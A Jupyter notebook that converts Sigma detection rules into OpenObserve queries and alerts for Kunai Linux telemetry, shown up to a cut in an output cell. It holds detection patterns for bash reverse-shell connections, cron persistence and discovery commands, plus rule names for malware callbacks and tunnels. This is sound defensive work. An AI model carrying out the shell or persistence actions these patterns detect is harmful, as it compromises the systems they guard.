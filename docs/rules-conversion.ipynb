{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# OpenObserve Kunai - Msticpy - sigma rules conversion"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Description\n",
        "This notebook helps to convert, review and transform sigma rules to openobserve queries and alerts.\n",
        "\n",
        "It leverages python_openobserve, msticpy and sigma.\n",
        "\n",
        "Known issue(s):\n",
        "* convert_rule2alert() folder_id not working, alert created in default folder.\n",
        "\n",
        "Last updated: 2025/07/06"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Installation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Only run first time to install/upgrade msticpy to latest version\n",
        "# %pip install --upgrade msticpy python-openobserve"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Setup"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "ExecuteTime": {
          "end_time": "2020-08-07T19:14:46.801520Z",
          "start_time": "2020-08-07T19:14:44.889959Z"
        },
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:32.894266Z",
          "iopub.status.busy": "2025-07-06T20:40:32.894050Z",
          "iopub.status.idle": "2025-07-06T20:40:34.180469Z",
          "shell.execute_reply": "2025-07-06T20:40:34.179628Z",
          "shell.execute_reply.started": "2025-07-06T20:40:32.894245Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Imports Complete\n"
          ]
        }
      ],
      "source": [
        "# Check we are running Python 3.6\n",
        "import sys\n",
        "\n",
        "MIN_REQ_PYTHON = (3, 6)\n",
        "if sys.version_info < MIN_REQ_PYTHON:\n",
        "    print(\"Check the Kernel->Change Kernel menu and ensure that Python 3.6\")\n",
        "    print(\"or later is selected as the active kernel.\")\n",
        "    sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_REQ_PYTHON)\n",
        "\n",
        "# imports\n",
        "import pandas as pd\n",
        "from datetime import datetime, timedelta\n",
        "\n",
        "# data library imports\n",
        "from msticpy.data.data_providers import QueryProvider\n",
        "\n",
        "print(\"Imports Complete\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:34.182297Z",
          "iopub.status.busy": "2025-07-06T20:40:34.181915Z",
          "iopub.status.idle": "2025-07-06T20:40:34.394847Z",
          "shell.execute_reply": "2025-07-06T20:40:34.394023Z",
          "shell.execute_reply.started": "2025-07-06T20:40:34.182278Z"
        }
      },
      "outputs": [],
      "source": [
        "# to create alerts\n",
        "import json\n",
        "from python_openobserve.openobserve import OpenObserve\n",
        "from dotenv import load_dotenv"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:34.396414Z",
          "iopub.status.busy": "2025-07-06T20:40:34.396164Z",
          "iopub.status.idle": "2025-07-06T20:40:34.403424Z",
          "shell.execute_reply": "2025-07-06T20:40:34.401744Z",
          "shell.execute_reply.started": "2025-07-06T20:40:34.396390Z"
        }
      },
      "outputs": [],
      "source": [
        "import os\n",
        "\n",
        "# Custom Certificate Authority?\n",
        "# os.environ[\"REQUESTS_CA_BUNDLE\"] = os.environ[\"HOME\"] + \"/tmp/ca-bundle-internal.pem\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:34.405245Z",
          "iopub.status.busy": "2025-07-06T20:40:34.404938Z",
          "iopub.status.idle": "2025-07-06T20:40:34.418952Z",
          "shell.execute_reply": "2025-07-06T20:40:34.418329Z",
          "shell.execute_reply.started": "2025-07-06T20:40:34.405225Z"
        }
      },
      "outputs": [],
      "source": [
        "# use custom config file?\n",
        "# os.environ['MSTICPYCONFIG'] = '/path/to/msticpyconfig.yaml'"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# FIXME! does not get MSTICPYCONFIG...\n",
        "from msticpy.config import MpConfigFile, MpConfigEdit\n",
        "\n",
        "mpconfig = MpConfigFile()\n",
        "mpconfig.load_default()\n",
        "mpconfig.view_settings()\n",
        "# mpedit = MpConfigEdit()\n",
        "# mpedit"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "load_dotenv()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "\n",
        "## Instantiating a query provider\n",
        "\n",
        "You can instantiate a data provider for OpenObserve by specifying the credentials in connect or in msticpy config file. \n",
        "<br> If the details are correct and authentication is successful, it will show connected."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {},
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "connected with user root@example.com\n"
          ]
        }
      ],
      "source": [
        "openobserve_prov = QueryProvider(\"OpenObserve\")\n",
        "# openobserve_prov.connect(connection_str=<url>, user=<user>, password=<password>)\n",
        "# openobserve_prov.connect()\n",
        "openobserve_prov.connect(\n",
        "    connection_str=os.environ.get(\"OPENOBSERVE_URL\"),\n",
        "    user=os.environ.get(\"OPENOBSERVE_USER\"),\n",
        "    password=os.environ.get(\"OPENOBSERVE_PASS\"),\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {},
      "outputs": [],
      "source": [
        "openobserve_prov_direct = OpenObserve(\n",
        "    host=os.environ.get(\"OPENOBSERVE_URL\"),\n",
        "    user=os.environ.get(\"OPENOBSERVE_USER\"),\n",
        "    password=os.environ.get(\"OPENOBSERVE_PASS\"),\n",
        ")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Running test OpenObserve query"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 8,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:39.219708Z",
          "iopub.status.busy": "2025-07-06T20:40:39.219455Z",
          "iopub.status.idle": "2025-07-06T20:40:39.700005Z",
          "shell.execute_reply": "2025-07-06T20:40:39.699476Z",
          "shell.execute_reply.started": "2025-07-06T20:40:39.219688Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "INFO: from 2025-07-05 20:40:39.233681 to 2025-07-06 20:40:39.233681, TZ UTC\n",
            "'Query Time start 1751748039233681 end 1751834439233681'\n",
            "{'query': {'end_time': 1751834439233681,\n",
            "           'sql': '\\n'\n",
            "                  'SELECT log_file_name,count(*) FROM \"default\" GROUP BY '\n",
            "                  'log_file_name\\n',\n",
            "           'start_time': 1751748039233681}}\n",
            "DEBUG: results shape (1, 2)\n"
          ]
        },
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>count(*)</th>\n",
              "      <th>log_file_name</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>5</td>\n",
              "      <td>history.log</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "   count(*) log_file_name\n",
              "0         5   history.log"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "openobserve_query = \"\"\"\n",
        "SELECT log_file_name,count(*) FROM \"default\" GROUP BY log_file_name\n",
        "\"\"\"\n",
        "df = openobserve_prov.exec_query(openobserve_query, days=1, verbosity=1)\n",
        "df.head()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {},
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>body__systemd_unit</th>\n",
              "      <th>count(*)</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>ssh.service</td>\n",
              "      <td>30301</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>wpa_supplicant.service</td>\n",
              "      <td>7959</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>cron.service</td>\n",
              "      <td>5103</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>init.scope</td>\n",
              "      <td>3820</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>NaN</td>\n",
              "      <td>1350</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "       body__systemd_unit  count(*)\n",
              "0             ssh.service     30301\n",
              "1  wpa_supplicant.service      7959\n",
              "2            cron.service      5103\n",
              "3              init.scope      3820\n",
              "4                     NaN      1350"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "openobserve_query = \"\"\"SELECT body__systemd_unit, count(*) FROM \"journald\" group by body__systemd_unit order by count(*) desc\"\"\"\n",
        "df = openobserve_prov.exec_query(\n",
        "    openobserve_query,\n",
        "    start_time=datetime.now() - timedelta(days=1),\n",
        "    end_time=datetime.now() - timedelta(days=0),\n",
        ")\n",
        "df.head()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "##\u00a0Sigma settings"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "metadata": {},
      "outputs": [],
      "source": [
        "base_rulesdir = os.environ[\"HOME\"] + \"/tmp/sigma/rules/linux/network_connection\"\n",
        "pipeline_f = (\n",
        "    os.environ[\"HOME\"]\n",
        "    + \"/tmp/pySigma-backend-openobserve/sigma/pipelines/openobserve/kunai.yml\"\n",
        ")\n",
        "table_name = \"kunai\"\n",
        "# numeric id\n",
        "target_folder_id = 73456789"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Sigma functions"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 11,
      "metadata": {},
      "outputs": [],
      "source": [
        "import pathlib\n",
        "\n",
        "from sigma.collection import SigmaCollection\n",
        "from sigma.backends.openobserve import openobserve\n",
        "from sigma.pipelines.sysmon import sysmon_pipeline\n",
        "from sigma.pipelines.common import logsource_linux_process_creation\n",
        "from sigma.pipelines.common import logsource_linux_file_create\n",
        "from sigma.pipelines.common import logsource_linux_network_connection\n",
        "\n",
        "from sigma.processing.resolver import ProcessingPipelineResolver\n",
        "\n",
        "# Create the pipeline resolver\n",
        "piperesolver = ProcessingPipelineResolver()\n",
        "# Add pipelines\n",
        "piperesolver.add_pipeline_class(sysmon_pipeline())  # Sysmon\n",
        "# FIXME! AttributeError: 'LogsourceCondition' object has no attribute 'name'\n",
        "# piperesolver.add_pipeline_class(logsource_linux_process_creation()) # Linux\n",
        "# piperesolver.add_pipeline_class(logsource_linux_file_create()) # Linux\n",
        "# piperesolver.add_pipeline_class(logsource_linux_network_connection()) # Linux"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {},
      "outputs": [],
      "source": [
        "from sigma.pipelines.openobserve.kunai import kunai_pipeline\n",
        "\n",
        "piperesolver.add_pipeline_class(kunai_pipeline())"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 13,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Create a combined pipeline\n",
        "combined_pipeline = piperesolver.resolve(piperesolver.pipelines)\n",
        "# Instantiate backend using the combined pipeline\n",
        "openobserve_backend = openobserve.openobserveBackend(combined_pipeline)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 14,
      "metadata": {},
      "outputs": [],
      "source": [
        "from subprocess import check_output\n",
        "import sqlglot"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 15,
      "metadata": {},
      "outputs": [],
      "source": [
        "# https://github.com/SigmaHQ/sigma-cli/blob/main/sigma/cli/convert.py#L8\n",
        "from sigma.exceptions import (\n",
        "    SigmaError,\n",
        "    SigmaPipelineNotAllowedForBackendError,\n",
        "    SigmaPipelineNotFoundError,\n",
        ")\n",
        "from sigma.plugins import InstalledSigmaPlugins\n",
        "\n",
        "plugins = InstalledSigmaPlugins.autodiscover()\n",
        "backends = plugins.backends\n",
        "pipelines = plugins.pipelines\n",
        "pipeline_resolver = plugins.get_pipeline_resolver()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 16,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Debug\n",
        "# piperesolver"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 17,
      "metadata": {},
      "outputs": [],
      "source": [
        "def convert_rulefile(rule_f, table_name, sigma_backend, output_format=\"default\"):\n",
        "    with open(rule_f, \"r\", encoding=\"utf-8\") as f:\n",
        "        print(f\" => Reading rule file {rule_f}\")\n",
        "        rule_y = f.read()\n",
        "\n",
        "    rule = SigmaCollection.from_yaml(rule_y)\n",
        "    rule_sql = sigma_backend.convert(rule, output_format)\n",
        "    # print(f\"DEBUG type {type(rule_sql)}\")\n",
        "    if output_format == \"o2alert\":\n",
        "        # NOK\n",
        "        # rule_tmp = json.loads(rule_sql)\n",
        "        # rule_sql = rule_tmp[0]\n",
        "        rule_sql = rule_sql.replace(\"\\n\", \"\")\n",
        "        # rule_sql = rule_sql[1:-1]\n",
        "    rule_sql = rule_sql.replace(\"<TABLE_NAME>\", f\"{table_name}\")\n",
        "\n",
        "    # print(f\" => rule out {rule_sql}\")\n",
        "\n",
        "    return rule_sql"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 18,
      "metadata": {},
      "outputs": [],
      "source": [
        "def convert_rulesdir(\n",
        "    openobserve_prov,\n",
        "    rulesdir,\n",
        "    table_name,\n",
        "    sigma_backend,\n",
        "    stats=False,\n",
        "    limit=5,\n",
        "    verbosity=0,\n",
        "):\n",
        "    \"\"\"\n",
        "    Convert sigma rules from rulesdir with given sigma backend and openobserve table, Run them\n",
        "    Return results shape rules list, empty results rules lists, errors rules list\n",
        "\n",
        "    Full python\n",
        "\n",
        "    Args:\n",
        "      openobserve_prov: msticpy provider object to run queries\n",
        "      rulesdir: directory path containing the rules to evaluate\n",
        "      table_name: openobserve table/streams name to use for the rules\n",
        "      sigma_backend: sigma backend to use for conversion, including pipeline\n",
        "      stats: run extra queries to provide statistics/TopN process for each rule\n",
        "      limit: TopN used for statistics\n",
        "      verbosity: debug/troubleshoot from 0/less to 5/more\n",
        "    \"\"\"\n",
        "    # rule_f => empty bool, errors true, lines returned\n",
        "    df_results = pd.DataFrame(columns=[\"rule\", \"empty\", \"errors\", \"hits\"])\n",
        "    df_stats = pd.DataFrame()\n",
        "    for rule_f in pathlib.Path(rulesdir).iterdir():\n",
        "        rule_s = rule_f.name\n",
        "        # print(f\"Listed rule file {rule_f}\")\n",
        "        if not rule_f.is_file():  # or str(rule_f).endswith('.yml'):\n",
        "            print(f\"Skipping rule file {rule_f}\")\n",
        "            continue\n",
        "\n",
        "        print(f\"=> Processing rule file {rule_s}:\")\n",
        "        rule_sql = convert_rulefile(rule_f, table_name, sigma_backend)\n",
        "\n",
        "        # basic verify sql\n",
        "        try:\n",
        "            sqlglot.transpile(rule_sql)\n",
        "        except sqlglot.errors.ParseError as exc:\n",
        "            # raise exc\n",
        "            print(f\"Error from sqlglot on rule: {rule_sql} as {exc}\")\n",
        "        except Exception as exc:\n",
        "            print(f\"Exception on rule: {rule_sql} as {exc}\")\n",
        "        # print(f\"```{rule_sql}```\")\n",
        "\n",
        "        try:\n",
        "            df = openobserve_prov.exec_query(\n",
        "                rule_sql,\n",
        "                days=1,\n",
        "            )\n",
        "        except:\n",
        "            df_results.loc[len(df_results)] = [rule_s, False, True, 0]\n",
        "            continue\n",
        "\n",
        "        if df.empty:\n",
        "            df_results.loc[len(df_results)] = [rule_s, True, False, 0]\n",
        "        else:\n",
        "            df_results.loc[len(df_results)] = [rule_s, False, False, df.shape[0]]\n",
        "            if stats:\n",
        "                try:\n",
        "                    # print(f\"Calculating stats for {rule_s}\")\n",
        "                    df_stats_tmp = rulestats_agg(\n",
        "                        rule_s,\n",
        "                        rule_sql,\n",
        "                        openobserve_prov,\n",
        "                        1,\n",
        "                        limit=limit,\n",
        "                        verbosity=verbosity,\n",
        "                    )\n",
        "                    df_stats = pd.concat([df_stats, df_stats_tmp])\n",
        "                    # print(f\"  -> {df_stats_tmp.shape}, {df_stats.shape}\")\n",
        "                except Exception as err:\n",
        "                    print(f\"stats exception: {err}\")\n",
        "\n",
        "    return (df_results, df_stats)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 19,
      "metadata": {},
      "outputs": [],
      "source": [
        "# `sigma convert -t openobserve -p ../pySigma-backend-openobserve/sigma/pipelines/openobserve/kunai.yml ../sigma/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml`\n",
        "def convert_rulesdir_cli(\n",
        "    openobserve_prov,\n",
        "    rulesdir,\n",
        "    pipeline_f,\n",
        "    table_name,\n",
        "    stats=False,\n",
        "    limit=5,\n",
        "    verbosity=0,\n",
        "):\n",
        "    \"\"\"\n",
        "    Convert sigma rules from rulesdir with given pipeline and openobserve table, Run them\n",
        "    Return results shape rules list, empty results rules lists, errors rules list\n",
        "    \"\"\"\n",
        "    # rule_f => empty bool, errors true, lines returned\n",
        "    df_results = pd.DataFrame(columns=[\"rule\", \"empty\", \"errors\", \"hits\"])\n",
        "    df_stats = pd.DataFrame()\n",
        "    for rule_f in pathlib.Path(rulesdir).iterdir():\n",
        "        rule_s = rule_f.name\n",
        "        if not rule_f.is_file():\n",
        "            print(f\"Skipping rule file {rule_s}\")\n",
        "            continue\n",
        "\n",
        "        cmd = f\"sigma convert -t openobserve -p {pipeline_f} {rule_f}\"\n",
        "        print(f\"=> Processing rule file {rule_s}:\")\n",
        "        rule_sql = check_output(\n",
        "            [\"sigma\", \"convert\", \"-t\", \"openobserve\", \"-p\", pipeline_f, rule_f],\n",
        "            encoding=\"UTF-8\",\n",
        "        )\n",
        "        rule_sql = str(rule_sql).replace(\"<TABLE_NAME>\", f'\"{table_name}\"')\n",
        "        print(f\"```{rule_sql}```\")\n",
        "        try:\n",
        "            df = openobserve_prov.exec_query(\n",
        "                rule_sql,\n",
        "                days=1,\n",
        "            )\n",
        "        except:\n",
        "            df_results.loc[len(df_results)] = [rule_s, False, True, 0]\n",
        "            continue\n",
        "\n",
        "        if df.empty:\n",
        "            df_results.loc[len(df_results)] = [rule_s, True, False, 0]\n",
        "        else:\n",
        "            df_results.loc[len(df_results)] = [rule_s, False, False, df.shape[0]]\n",
        "            if stats:\n",
        "                try:\n",
        "                    # print(f\"Calculating stats for {rule_s}\")\n",
        "                    df_stats_tmp = rulestats_agg(\n",
        "                        rule_s,\n",
        "                        rule_sql,\n",
        "                        openobserve_prov,\n",
        "                        1,\n",
        "                        limit=limit,\n",
        "                        verbosity=verbosity,\n",
        "                    )\n",
        "                    df_stats = pd.concat([df_stats, df_stats_tmp])\n",
        "                    # print(f\"  -> {df_stats_tmp.shape}, {df_stats.shape}\")\n",
        "                except Exception as err:\n",
        "                    print(f\"stats exception: {err}\")\n",
        "\n",
        "    return (df_results, df_stats)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 20,
      "metadata": {},
      "outputs": [],
      "source": [
        "def rulestats_agg(rulename, rule_sql, openobserve_prov, days, limit=5, verbosity=0):\n",
        "    \"\"\"\n",
        "    Make an aggregate count to identify Top results that are possibly noise\n",
        "    https://sqlglot.com/sqlglot.html#examples\n",
        "    \"\"\"\n",
        "    import sqlglot\n",
        "\n",
        "    column_names = []\n",
        "\n",
        "    # usually includes: data_command_line \tdata_exe_path \tinfo_event_name\n",
        "    for column in sqlglot.parse_one(rule_sql).find_all(sqlglot.exp.Column):\n",
        "        # print(column.alias_or_name)\n",
        "        column_names.append(column.alias_or_name)\n",
        "    column_names.append(\"info_task_name\")\n",
        "    column_names.append(\"info_parent_task_name\")\n",
        "    column_names = list(set(column_names))\n",
        "    # print(column_names)\n",
        "    # Make aggregated query\n",
        "    agg_sql = (\n",
        "        rule_sql.replace(\n",
        "            \"SELECT * \", f\"SELECT {\",\".join(column_names)},count(*) as count_ \"\n",
        "        )\n",
        "        + f\" GROUP BY {\",\".join(column_names)} ORDER BY count_ DESC LIMIT {limit}\"\n",
        "    )\n",
        "    # only works if len(column_names)=1\n",
        "    # agg_sql = f\"SELECT string_agg({\",\".join(column_names)}, ', ') as topN FROM (\" + test_sql.replace(\"SELECT * \", f\"SELECT {\",\".join(column_names)},count(*) as count_ \") + f\" GROUP BY {\",\".join(column_names)} ORDER BY count_ DESC LIMIT {topN}\" + ')'\n",
        "    # agg_sql = f\"SELECT string_agg(data_exe_path, ', ') as topN FROM (\" + test_sql.replace(\"SELECT * \", f\"SELECT {\",\".join(column_names)},count(*) as count_ \") + f\" GROUP BY {\",\".join(column_names)} ORDER BY count_ DESC LIMIT {topN}\" + ')'\n",
        "    # print(agg_sql)\n",
        "\n",
        "    df_agg = openobserve_prov.exec_query(agg_sql, days=days, verbosity=verbosity)\n",
        "    df_agg[\"rule\"] = rulename\n",
        "    return df_agg"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 21,
      "metadata": {},
      "outputs": [],
      "source": [
        "def convert_rule2alert(\n",
        "    openobserve,\n",
        "    rule_f,\n",
        "    pipeline_f,\n",
        "    table_name,\n",
        "    alertowner,\n",
        "    alertdestination,\n",
        "    sigma_backend,\n",
        "    folderid=\"\",\n",
        "    verbosity=0,\n",
        "    overwrite=False,\n",
        "):\n",
        "    \"\"\"\n",
        "    Convert given sigma rule to openobserve alert and set it in live instance\n",
        "    Return results shape rules list, empty results rules lists, errors rules list\n",
        "    \"\"\"\n",
        "    print(f\"=> Processing rule file {rule_f}:\")\n",
        "    # cli\n",
        "    # cmd = f'sigma convert -t openobserve -f o2alert -p {pipeline_f} {rule_f}'\n",
        "    # rule_alert = check_output(['sigma', 'convert', '-t', 'openobserve', '-f', 'o2alert', '-p', pipeline_f, rule_f], encoding='UTF-8')\n",
        "    # rule_alert = str(rule_alert).replace('<TABLE_NAME>', table_name)\n",
        "    # python\n",
        "    rule_alert = convert_rulefile(\n",
        "        rule_f, table_name, sigma_backend, output_format=\"o2alert\"\n",
        "    )\n",
        "    # rule_alert = convert_rulefile(rule_f, table_name, sigma_backend, output_format=\"default\")\n",
        "\n",
        "    rule_alert = str(rule_alert).replace(\"<alert-owner-TBD>\", alertowner)\n",
        "    rule_alert = str(rule_alert).replace(\"<alert-destination-TBD>\", alertdestination)\n",
        "    rule_alert = str(rule_alert).replace(\"<alert-folder_id-TBD>\", str(folderid))\n",
        "    # 'Return 400. Text: Json deserialize error: invalid type: sequence, expected struct CreateAlertRequestBody at line 1 column 0' -> take array[0] from str\n",
        "    rule_alert = rule_alert[1:-1]\n",
        "\n",
        "    print(f\"```(type {type(rule_alert)}: {rule_alert}```\")\n",
        "\n",
        "    openobserve.create_update_object_by_name(\n",
        "        \"alerts\",\n",
        "        json.loads(rule_alert),\n",
        "        verbosity=verbosity,\n",
        "        overwrite=overwrite,\n",
        "    )"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Functions tests"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 22,
      "metadata": {},
      "outputs": [],
      "source": [
        "# test_sql = \"\"\"SELECT * FROM \"kunai\" WHERE (data_path LIKE '/etc/cron.d/%' OR data_path LIKE '/etc/cron.daily/%' OR data_path LIKE '/etc/cron.hourly/%' OR data_path LIKE '/etc/cron.monthly/%' OR data_path LIKE '/etc/cron.weekly/%' OR data_path LIKE '/var/spool/cron/crontabs/%') OR (data_path LIKE '%/etc/cron.allow%' OR data_path LIKE '%/etc/cron.deny%' OR data_path LIKE '%/etc/crontab%')\"\"\"\n",
        "# test_sql = \"\"\"SELECT * FROM \"kunai\" WHERE data_exe_path LIKE '%/bin/bash' AND (NOT (data_dst_ip='127.0.0.1' OR data_dst_ip='0.0.0.0'))\"\"\"\n",
        "test_sql = \"\"\"SELECT * FROM \"kunai\" WHERE (data_exe_path LIKE '%/file' AND regexp_like(data_command_line, '(.){200,}', 'i')) OR (data_exe_path LIKE '%/ls' AND data_command_line LIKE '%-R%') OR data_exe_path LIKE '%/find' OR data_exe_path LIKE '%/tree' OR data_exe_path LIKE '%/findmnt' OR data_exe_path LIKE '%/mlocate'\"\"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 23,
      "metadata": {},
      "outputs": [],
      "source": [
        "rulestats_agg(\"rulename\", test_sql, openobserve_prov, 1)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 24,
      "metadata": {},
      "outputs": [],
      "source": [
        "rule_f = (\n",
        "    os.environ.get(\"HOME\")\n",
        "    + \"/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml\"\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 25,
      "metadata": {},
      "outputs": [],
      "source": [
        "convert_rulefile(rule_f, table_name, openobserve_backend, output_format=\"default\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 26,
      "metadata": {},
      "outputs": [],
      "source": [
        "convert_rulefile(rule_f, table_name, openobserve_backend, output_format=\"o2alert\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 27,
      "metadata": {},
      "outputs": [],
      "source": [
        "convert_rule2alert(\n",
        "    openobserve_prov_direct,\n",
        "    rule_f,\n",
        "    pipeline_f,\n",
        "    \"kunai\",\n",
        "    \"root@example.com\",\n",
        "    \"alert-destination-email\",\n",
        "    openobserve_backend,\n",
        "    folderid=target_folder_id,\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 28,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Rules Conversion\n",
        "Convert rules, check against live instance if returns results, errors or not.\n",
        "Include or not statistics of TopN aggregated result for matching rule."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 29,
      "metadata": {},
      "outputs": [],
      "source": [
        "rulesdir = base_rulesdir + \"/network_connection\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 30,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:40:45.513210Z",
          "iopub.status.busy": "2025-07-06T20:40:45.513001Z",
          "iopub.status.idle": "2025-07-06T20:41:36.792082Z",
          "shell.execute_reply": "2025-07-06T20:41:36.791569Z",
          "shell.execute_reply.started": "2025-07-06T20:40:45.513190Z"
        }
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "=> Processing rule file net_connection_lnx_crypto_mining_indicators.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml\n",
            "=> Processing rule file net_connection_lnx_back_connect_shell_dev.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml\n",
            "=> Processing rule file net_connection_lnx_domain_localtonet_tunnel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml\n",
            "=> Processing rule file net_connection_lnx_susp_malware_callback_port.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml\n",
            "=> Processing rule file net_connection_lnx_ngrok_tunnel.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml\n"
          ]
        }
      ],
      "source": [
        "(df_res1, df_stats1) = convert_rulesdir(\n",
        "    openobserve_prov, rulesdir, table_name, openobserve_backend, stats=True\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 31,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T20:41:36.793159Z",
          "iopub.status.busy": "2025-07-06T20:41:36.792981Z",
          "iopub.status.idle": "2025-07-06T20:41:36.801677Z",
          "shell.execute_reply": "2025-07-06T20:41:36.800946Z",
          "shell.execute_reply.started": "2025-07-06T20:41:36.793143Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
